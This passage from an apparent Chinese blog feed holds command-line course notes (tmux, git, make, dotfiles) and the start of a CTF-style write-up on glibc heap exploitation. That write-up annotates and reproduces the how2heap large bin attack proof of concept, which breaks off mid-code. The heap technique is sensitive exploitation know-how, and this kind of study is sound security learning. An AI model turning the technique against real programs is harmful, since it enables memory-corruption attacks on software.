<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cut</span> [option] filename</span><br><span class="line">	-d   字节为单位分割  </span><br><span class="line">		<span class="built_in">cut</span> -d 3  第三个字符  -d 3-9,12  第3-9,12个字符</span><br><span class="line">	-f   fields 与-d一起使用，表示区域</span><br><span class="line">		<span class="built_in">cut</span> -d : -f2  第1-2个冒号之前的内容</span><br><span class="line">	-c   character 字符为单位，处理中文好用</span><br><span class="line">	-b   </span><br></pre></td></tr></table></figure>

<ul>
<li>编程语言在命令行的使用? 各种管道，图片音频处理?</li>
</ul>
<h2 id="lecture5-command-line-environment"><a href="#lecture5-command-line-environment" class="headerlink" title="lecture5: command-line environment"></a>lecture5: command-line environment</h2><blockquote>
<p>优雅的使用命令行</p>
</blockquote>
<h3 id="job-control"><a href="#job-control" class="headerlink" title="job control"></a>job control</h3><ul>
<li>Linux 系统的 signal机制</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man signal : 会看到不同的number 和 name</span><br><span class="line"></span><br><span class="line">ctrl-c   SIGINT   signal interrupt</span><br><span class="line">ctrl-\   SIGQUIT</span><br></pre></td></tr></table></figure>

<ul>
<li>ctrl+z</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 暂停，可执行其他任务</span></span><br><span class="line">&amp;     在命令后加入，表示后台执行</span><br><span class="line"><span class="built_in">jobs</span>  查看后台任务，暂停或者运行 pid</span><br><span class="line"><span class="built_in">fg</span> %num / <span class="built_in">bg</span> %num  使暂停的任务继续运行，<span class="built_in">fg</span> 恢复到前台。<span class="built_in">bg</span> 恢复到后台执行。front back ground</span><br><span class="line"><span class="built_in">kill</span> %num            停止</span><br></pre></td></tr></table></figure>

<h3 id="terminal-multiplexers"><a href="#terminal-multiplexers" class="headerlink" title="terminal multiplexers"></a>terminal multiplexers</h3><ul>
<li><p>终端复用，在一个terminal window干很多事情。</p>
</li>
<li><p>很多的终端都存在分屏等操作，但是课程介绍神器 <code>tmux</code>，更加神奇。</p>
<ul>
<li>不 kill session，其中的命令会一直执行下去。只需要开启一次终端。</li>
<li>在ssh 服务器时非常的好用</li>
</ul>
</li>
<li><p>session, window, pune</p>
<ul>
<li>启动tmux, 会开启一个session, 明显的是下面会出现一行数据。</li>
<li>window 创建一个新的shell 终端。</li>
<li>pune 面板，一个窗口可以分很多的面板。</li>
</ul>
</li>
<li><p>命令行操作</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tmux</span><br><span class="line">	下部会出现状态栏，分别是session window1 windiow2...     时间等</span><br><span class="line"></span><br><span class="line">tmux a   <span class="comment"># attach 进入session</span></span><br><span class="line">		-t name  指定名称</span><br><span class="line"></span><br><span class="line">tmux new -t &lt;name&gt;       创建并指定名称</span><br><span class="line">tmux kill-session -t &lt;num/name&gt;  杀死指定的session</span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">ls</span>   查看所有的session</span><br><span class="line"></span><br><span class="line">tmux splitw -h/-v   pane 横竖分割window</span><br></pre></td></tr></table></figure>

<ul>
<li>默认快捷键。可以先按一下 <code>ctrl-b</code> 在按其余的，不需要同时按。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">prefix = Ctrl-b</span><br><span class="line"><span class="comment"># session prefix keymap</span></span><br><span class="line">prefix d   dettach session</span><br><span class="line">prefix s   列出所有session vim快捷键下的选择</span><br><span class="line"></span><br><span class="line"><span class="comment"># window</span></span><br><span class="line">prefix c   create a new window</span><br><span class="line">prefix p   previous window</span><br><span class="line">prefix n   next window</span><br><span class="line">prefix &lt;n&gt; 第n个窗口,n是个数字</span><br><span class="line">prefix w   列出window 和 session(s ?),  jk 选择，enter进入</span><br><span class="line">prefix ,   重命名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pune</span></span><br><span class="line">prefix x       关闭pune</span><br><span class="line">prefix %       竖直切割</span><br><span class="line">prefix <span class="string">&quot;       水平切割</span></span><br><span class="line"><span class="string">prefix 方向键   选择 pune</span></span><br><span class="line"><span class="string">prefix x       关闭pune</span></span><br><span class="line"><span class="string">prefix z       最大化当前窗口，在按一次退出</span></span><br><span class="line"><span class="string">prefix !       分离pune 进入window</span></span><br><span class="line"><span class="string">持续按prefix 方向键  改变pune大小</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>配置快捷键， <code>~/.tmux.conf</code>。我使用的是基于网上找的 <a href="https://www.debugpointer.com/linux/tmux-conf">tmux-conf</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl-b 距离非常有点阴间，因此需要改。ctrl-a 是qemu快捷键。因此选择ctrl-x</span><br><span class="line"></span><br><span class="line">prefix I             install plugins</span><br><span class="line">prefix alt I         uninstall</span><br><span class="line"></span><br><span class="line">alt + 方向键，pune 移动</span><br></pre></td></tr></table></figure>
</li>
<li><p>插件管理 <a href="https://github.com/tmux-plugins/tpm">Tmux Plugin Manager</a></p>
</li>
<li><p>美化+快捷键 系列操作参考。<a href="https://github.com/rothgar/awesome-tmux#themes">awesome-tmux: A list of awesome resources for tmux</a></p>
</li>
</ul>
<h3 id="aliases"><a href="#aliases" class="headerlink" title="aliases"></a>aliases</h3><ul>
<li>给常用的命令设置别名 <ul>
<li>bash 的<code>~/.bashrc</code> 文件</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注意，不要存在 ll = &#x27;ls -l&#x27; 因为在shell script中，空格是有意义的</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br></pre></td></tr></table></figure>


<h3 id="dotfiles"><a href="#dotfiles" class="headerlink" title="dotfiles"></a>dotfiles</h3><ul>
<li><p>各种配置文件。大部分是文件</p>
</li>
<li><p>bash -&gt; <code>~/.bashrc</code></p>
</li>
<li><p>zsh -&gt; <code>~/.zshrc</code>。我们的zsh美化也是修改此文件。</p>
</li>
<li><p>vim -&gt; <code>~/.vimrc</code></p>
</li>
<li><p>tmux -&gt; <code>~/tmux.conf</code></p>
</li>
<li><p>neovim -&gt; <code>~/.config/nvim</code> 目录下的 <code>基于lua</code> 配置</p>
</li>
<li><p>ssh -&gt; <code>~/.ssh</code> 这是一个目录。可以配置公私钥，免密登录。</p>
<ul>
<li>自己的机器 <code>ssh-keygen</code> 命令生成公私钥</li>
<li>将公钥放入服务器的 <code>authorized_keys</code>。权限一般是<code>600</code></li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub  &lt;username&gt;@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用的ssh 传输文件 scp  和cp命令差不多，给出路径</span></span><br><span class="line">scp tmp.txt &lt;user&gt;@&lt;IP&gt;:/tmp</span><br></pre></td></tr></table></figure>

<ul>
<li><p>感兴趣的可以学习一下 <a href="https://nixos.org/">NixOS</a>, 一个基于配置文件的操作系统😋</p>
</li>
<li><p>大部分配置都可在 github 查找到，如果不想自己配置，直接 <code>clone/fork</code> 一个其他人的。</p>
</li>
<li><p>bash 前面的一串的修改</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS1=<span class="string">&quot;user&gt;&quot;</span>   我们shell 前面的一串</span><br></pre></td></tr></table></figure>

<blockquote>
<p>问题：如何在本机和服务器同时使用tmux</p>
</blockquote>
<p>相同的配置会可能产生冲突，或者会使我们不知道操作的是哪一个，因此我们需要不同的配置文件。最简单的就是使用两个 <code>prefix</code> 。</p>
<h2 id="lecture6-virsion-control-git"><a href="#lecture6-virsion-control-git" class="headerlink" title="lecture6: virsion control(git)"></a>lecture6: virsion control(git)</h2><blockquote>
<p>git版本控制</p>
</blockquote>
<ul>
<li><p>开发项目，团队合作，文件损坏的回退。。。git都可以在很大程度上帮助我们，不需要删除在重新下载😘</p>
</li>
<li><p>git 抽象建模。使用有向无环图进行抽象</p>
<ul>
<li>顶层root，文件夹抽象为<code>tree</code>, 文件抽象为<code>blob</code></li>
<li>commit: 每次commit 产生一个类似 <code>snapshot(快照)</code>的东西，保存当前的状态以及一些信息(作者，描述…)。</li>
<li>通过 <code>mapping&lt;string, object&gt;</code> 进行管理.string指文件的哈希值(SHA-1)，object是我们文件保存的地址(‘snapshot’在磁盘中的地址)。每次修改，commit会产生新的hash</li>
</ul>
</li>
<li><p>reference: git需要的是文件的哈希值，对于人类毫无意义，因此存在另一个 <code>mapping&lt;string, string&gt;</code> 。我们使用可以人类方便阅读的字符串，映射到hash，然后在寻找到文件</p>
</li>
<li><p>git 几个状态，可以看看 <a href="https://www.bilibili.com/video/BV1r3411F7kn/?spm_id_from=333.337.search-card.all.click&vd_source=ccaa27461534d3a4a5e9b964672f86d6">Git工作流和核心原理</a>，非常有趣。在学习时，可以想象一下有向无环图进行理解。</p>
<ul>
<li>工作区</li>
<li>暂存区</li>
<li>本地仓库</li>
<li>远程仓库</li>
</ul>
</li>
<li><p>git 的配置</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置用户名，邮箱。自己的账户。</span></span><br><span class="line">git config --global user.name <span class="string">&quot;your name&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your email&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>创建一个git仓库</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> demo</span><br><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line"></span><br><span class="line">git init   <span class="comment"># 本地仓库初始化，出现一个 `.git` 的目录</span></span><br><span class="line"></span><br><span class="line">git status <span class="comment"># 查看仓库状态，非常常用</span></span><br></pre></td></tr></table></figure>

<ul>
<li>日志，查看提交的文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># oneline 去除一定的信息</span></span><br><span class="line">git <span class="built_in">log</span> --all --graph --decorate --oneline</span><br></pre></td></tr></table></figure>

<ul>
<li><p>其中存在一个 <code>HEAD</code> 指针指向当前工作的分支。</p>
</li>
<li><p>我们想忽略某些文件时</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 gitignore 文件配置</span></span><br><span class="line"><span class="built_in">touch</span> .gitignore</span><br><span class="line"></span><br><span class="line">*.jpg   <span class="comment"># 忽略所有的 jpg文件</span></span><br></pre></td></tr></table></figure>
<ul>
<li>本地操作</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line"><span class="comment"># 写点新文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; readme.md  <span class="comment"># 处于untracked 状态，使用git status 会存在提示</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存区</span></span><br><span class="line">git add readme.txt       <span class="comment"># 处于tracked 状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交到本地仓库</span></span><br><span class="line">git commit  <span class="comment"># 进入文件，进行描述修改的内容</span></span><br><span class="line">	-m <span class="string">&quot;message&quot;</span>  <span class="comment"># message 代表描述，简短描述可以这样使用</span></span><br></pre></td></tr></table></figure>


<ul>
<li>提交到远程代码仓库</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 远程创建后直接clone下来，然后再写内容</span></span><br><span class="line">git <span class="built_in">clone</span> <span class="string">&quot;your-repo&quot;</span></span><br><span class="line">git remote -v   <span class="comment"># 查看和那些仓库有联系</span></span><br><span class="line">git push        <span class="comment"># 有.git文件夹，可以找到仓库提交</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 我们在本地写了很多文件，但是中途想起来没有使用git，我们如何做？</span></span><br><span class="line"><span class="comment">## 还是需要先创建仓库</span></span><br><span class="line"><span class="comment">## 然后再本地</span></span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit</span><br><span class="line">git remote add <span class="string">&quot;name&quot;</span> git@&lt;your-repo&gt;  <span class="comment"># 关联远程仓库。</span></span><br><span class="line">							<span class="comment"># name 自己取，可以关联很多仓库，根据名字区分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 但是本地仓库一般是master，某些平台是main(也可以选，但是默认是main)，这一步可能出错，需要切换分支 `git checkout -b main`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 远程分支不存在会创建一个</span></span><br><span class="line">git push <span class="string">&quot;仓库名称&quot;</span> <span class="string">&quot;本地分支名&quot;</span>:<span class="string">&quot;远程分支名&quot;</span>   <span class="comment"># 如果本地分支名与远程分支名相同，则可以省略冒号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 删除远程仓库</span></span><br><span class="line">git remote <span class="built_in">rm</span> <span class="string">&quot;仓库名&quot;</span></span><br></pre></td></tr></table></figure>


<ul>
<li>从远程仓库到工作区。比如团队合作中，远程仓库更新了，我们需要先同步。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接同步到本地，会直接更新本地文件</span></span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于pull 一步到位，也可分步进行</span></span><br><span class="line"><span class="comment">## 先更新到到本地仓库</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment">## diff 对比区别</span></span><br><span class="line">git diff </span><br><span class="line">    <span class="comment"># 查看本地仓库和工作区的区别</span></span><br><span class="line"><span class="comment">## pull 合并 = git fetch + git merge</span></span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>


<ul>
<li><p>分支操作。我们参与开源项目时，建议创建一个新分支push，由项目负责人决定是否合并(merge)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch <span class="string">&quot;name&quot;</span>  <span class="comment"># 创建一个分支 </span></span><br><span class="line">		-vv   <span class="comment"># 查看分支信息</span></span><br><span class="line"></span><br><span class="line">git checkout <span class="string">&quot;name&quot;</span>  <span class="comment"># 切换分支</span></span><br><span class="line">		-d <span class="string">&quot;name&quot;</span>    <span class="comment"># 删除分支</span></span><br><span class="line">		-D <span class="string">&quot;name&quot;</span>    <span class="comment"># 暴力删除</span></span><br><span class="line">		-b <span class="string">&quot;name&quot;</span>    <span class="comment"># 创建一个分支然后切换</span></span><br><span class="line"></span><br><span class="line">git merge      <span class="comment"># 将别的分支合并到 `当前分支` 中</span></span><br><span class="line">		<span class="comment"># 可能会存在冲突，在某一个相同的位置存在不同的内容.保存的话，自己决定然后修改冲突文件就行</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>git clone 会复制远程的所有文件，包含其所有的 <code>snapshot</code> 我们可以使用 <code>--shallow</code> 忽略这些</p>
</li>
<li><p>git 回滚：当我们在一个分支中<code>commit</code>后发现一个巨大的错误，需要回退到之前的版本。改变 <code>HEAD</code> 指针</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git stash   <span class="comment"># 回退到上一个commit 版本</span></span><br><span class="line">git bisect  <span class="comment"># 比较强大的工具</span></span><br><span class="line"></span><br><span class="line">git reset </span><br><span class="line">		--hard         <span class="comment"># 会丢失最新的代码修改</span></span><br><span class="line">		--soft         <span class="comment"># 将 HEAD 指针回退到指定提交，不改变暂存区和工作区的内容</span></span><br><span class="line">		</span><br><span class="line">			HEAD^       <span class="comment"># 上一个 版本</span></span><br><span class="line">			HEAD~&lt;num&gt;  <span class="comment"># 回退num个版本</span></span><br><span class="line">			&lt;<span class="built_in">hash</span>&gt;      <span class="comment"># 回退到指定哈希值的版本</span></span><br><span class="line"></span><br><span class="line">git revert -n <span class="built_in">hash</span>   <span class="comment"># 将版本复制一份，不会销毁</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>现在的IDE中存在git相关的工具，也更加方便了我们的使用。</p>
</li>
<li><p>也存在其余的版本控制工具，svn, repo……</p>
</li>
</ul>
<h3 id="repo-使用"><a href="#repo-使用" class="headerlink" title="repo 使用"></a>repo 使用</h3><ul>
<li><p><a href="https://source.android.google.cn/docs/setup/create/repo?hl=zh-cn#start">repo</a> 更适合多个仓库的管理，平常我们见的项目都是一个仓库。但是向Android这样的依赖上百个git仓库来说，依靠git并不是多么好使用，因此google 开发了repo工具，本质是一个python脚本，基于git。</p>
</li>
<li><p>初始化</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo init</span><br><span class="line">	-u git@&lt;repo&gt;/mainfest.git  <span class="comment"># 默认为google的仓库 https://gerrit.googlesource.com/git-repo</span></span><br><span class="line">								<span class="comment"># 这个目录下最简单只需要 default.xml</span></span><br><span class="line">	-b  <span class="comment"># 指定branch</span></span><br></pre></td></tr></table></figure>

<ul>
<li>-u后的仓库, xml文件(默认<code>default.xml</code>, 我们可以自己选择)，然后我们拉取的时候会将所有的git仓库拉取下来</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo init -u &lt;repo&gt;</span><br><span class="line">	-m 指定xml文件</span><br></pre></td></tr></table></figure>

<ul>
<li>拉取代码到本地</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo <span class="built_in">sync</span> -c</span><br></pre></td></tr></table></figure>

<ul>
<li>分支</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo branch  <span class="comment"># 查看分支</span></span><br><span class="line"></span><br><span class="line">repo start &lt;branch_name&gt; --all <span class="comment"># 创建分支并进入</span></span><br></pre></td></tr></table></figure>

<h2 id="lecture7-debugging-profiling"><a href="#lecture7-debugging-profiling" class="headerlink" title="lecture7: debugging &amp; profiling"></a>lecture7: debugging &amp; profiling</h2><blockquote>
<p>调试程序以及性能分析</p>
</blockquote>
<ul>
<li><p>查看日志，打印日志，制作日志</p>
</li>
<li><p>调试器</p>
<ul>
<li>GNU gdb，可以调试几乎所有的二进制程序</li>
<li>python pdb，python调试</li>
<li>浏览器调试js</li>
</ul>
</li>
<li><p>性能测试</p>
<ul>
<li>测试一个程序运行 time</li>
</ul>
</li>
</ul>
<h2 id="lecture8-metaprogramming"><a href="#lecture8-metaprogramming" class="headerlink" title="lecture8: metaprogramming"></a>lecture8: metaprogramming</h2><ul>
<li><p>如何更高的管理项目、测试、依赖管理。使用 <code>makefile</code></p>
</li>
<li><p>makefile 的使用比较简单。</p>
</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">目标: 依赖</span></span><br><span class="line">	命令  //前面必须是tab键</span><br><span class="line"></span><br><span class="line"><span class="section">main: main.c</span></span><br><span class="line">	gcc main.c -o mian</span><br></pre></td></tr></table></figure>

<ul>
<li>一些语法</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="variable">$^</span>   所有的依赖项</span><br><span class="line"><span class="variable">$&lt;</span>   一个依赖项</span><br><span class="line"><span class="variable">$@</span>   目标文件</span><br><span class="line">echo 打印</span><br><span class="line">%    通配符</span><br><span class="line">*    也是通配符</span><br></pre></td></tr></table></figure>

<ul>
<li>我们编译某些开源项目时也会使用 <code>make</code> 命令，可以看看别人怎么写的。</li>
<li>当然，还有其他的选择，比如 <code>cmake</code></li>
</ul>
<h2 id="lecture9-security-crypto"><a href="#lecture9-security-crypto" class="headerlink" title="lecture9: security &amp; crypto"></a>lecture9: security &amp; crypto</h2><blockquote>
<p>安全很多，也是一门专门的学科，想要深入就需要学专业课</p>
</blockquote>
<ul>
<li><p>hash: 用作信息摘要，签名，检查文件的完整性。</p>
<ul>
<li>md5</li>
<li>sha-1&#x2F;2&#x2F;3</li>
</ul>
</li>
<li><p>对称加密</p>
<ul>
<li>DES</li>
<li>AES</li>
</ul>
</li>
<li><p>非对称加密</p>
<ul>
<li>RSA</li>
<li>ECC</li>
</ul>
</li>
<li><p>数字签名</p>
</li>
</ul>
<h2 id="lecture10-potpourri"><a href="#lecture10-potpourri" class="headerlink" title="lecture10: potpourri"></a>lecture10: potpourri</h2><blockquote>
<p>大杂烩：讲述一些概念，熟练还得在以后多练习</p>
</blockquote>
<ul>
<li><p>键盘映射</p>
<ul>
<li>键盘上的<code>Caps Lock</code>几乎不怎么使用，我们可以重新配置一下(比如比较小的Esc)，让其发挥作用</li>
</ul>
</li>
<li><p>守护进程，daemon</p>
</li>
<li><p>APIs</p>
<ul>
<li>比如说部分天气的API，我们只需要请求特定的URL带着正确的参数，我们就可以获得返回结果。</li>
</ul>
</li>
<li><p>命令行参数</p>
<ul>
<li>我们使用的命令可以带有参数</li>
</ul>
</li>
<li><p>Window Manage</p>
</li>
<li><p>VPN</p>
</li>
<li><p>Jupyter Notebook: 交互式编程</p>
</li>
<li><p>GitHub: 代码托管平台</p>
<ul>
<li>创建自己的仓库</li>
<li>提issue，解决问题</li>
<li>pr: pull request，自己写的提交给作者</li>
<li>merge 别人的请求</li>
</ul>
</li>
</ul>
<h2 id="lecture11-Q-A"><a href="#lecture11-Q-A" class="headerlink" title="lecture11: Q&amp;A"></a>lecture11: Q&amp;A</h2><blockquote>
<p>来自学生的问题</p>
</blockquote>
<ul>
<li>如何进行操作系统的学习？<ul>
<li>learn by exercise: 学习比较出名的 OS 课程，完成相应的lab，实现自己的OS</li>
</ul>
</li>
</ul>
<p>…… 自己看看就行</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>vim</tag>
        <tag>terminal</tag>
      </tags>
  </entry>
  <entry>
    <title>猫猫 &amp;&amp; 苹果香蕉 の 屋</title>
    <url>/2023/11/02/%E7%8C%AB%E7%8C%AB%20&amp;&amp;%20%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89%20%E3%81%AE%20%E5%B1%8B/</url>
    <content><![CDATA[<blockquote>
<p>大古：一开始就用红色形态作战不就行了吗</p>
</blockquote>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc</code> 高版本逐渐移除了<code>__malloc_hook/__free_hook/__realloc_hook</code> 等等一众 <code>hook</code> 全局变量。</p>
<p>利用手段向 IO_FILE 靠拢，但是随着版本越来越高，堆利用手段也变少，IO_FILE 的问题也逐渐减少。</p>
<h3 id="large-bin-attck"><a href="#large-bin-attck" class="headerlink" title="large bin attck"></a>large bin attck</h3><p>一个范围的bin，保证了其内部有序性。在 <a href="https://xz.aliyun.com/t/5177">浅析largebin attack</a>文章中有张图方便理解<br>同样大小的bin按照free的时间顺序进行排序</p>
<ul>
<li>fd, bk: 相同大小堆的双向链表，按照时间先后排序</li>
<li>fd_nextsize, bk_nextsize: 大小不同的双向链表</li>
<li>如果只有一个，fd, bk指向 main_arena fd_nextsize 和 bk_nextsize 指向自己</li>
</ul>
<p>直接使用 how2heap 2.36 的 large bin attack 进行演示(Glibc &gt;&#x3D; 2.30 都可以使用)。</p>
<ul>
<li>漏洞的点在开头的注释中给出，就是最后一句赋值语句导致的，victim(正在链入largebin)的size小于已经存在的bin</li>
<li>malloc两个大chunk p1,p2，两个 0x18 是防止 <strong>相邻的unsorted bin 合并</strong> 以及 <strong>被top_chunk合并</strong>。</li>
<li>这里注意的是：p1 的 size 大于 p2，但是不要差太多，在同一个largebin 里</li>
<li>free p1，将 p1 放入large bin 中</li>
<li>free p2，修改 p1 的 bk_nextsize 为 &amp;target-0x20</li>
<li>将 p2 放入largebin中</li>
<li>target 值就变成了 p2 的地址</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment">	// 因为只有两个bin，因此可以解读一下。</span></span><br><span class="line"><span class="comment">	// 看源码，bck是  bck = bin_at (av, victim_index);</span></span><br><span class="line"><span class="comment">	// av 就是 arena地址，bck就是找arena</span></span><br><span class="line"><span class="comment">	// fwd = bck-&gt;fd;   与large bin 之间的双向链表，在这里就是存在的 p1</span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;                                    // fwd = arena</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;                                // bck = p1</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;                // vitim 要放入large bin 的堆 p2 </span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;   // victim.bk_nextsize = p1-&gt;bk_nextsize = &amp;target-0x20 </span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  // p1.bk_nextsize = victim</span></span><br><span class="line"><span class="comment">		// 但是victim.bk_nextsize = &amp;target-0x20。而这个地址的 fd_nextsize = victim 也就是将 target 值改为 victim，</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span 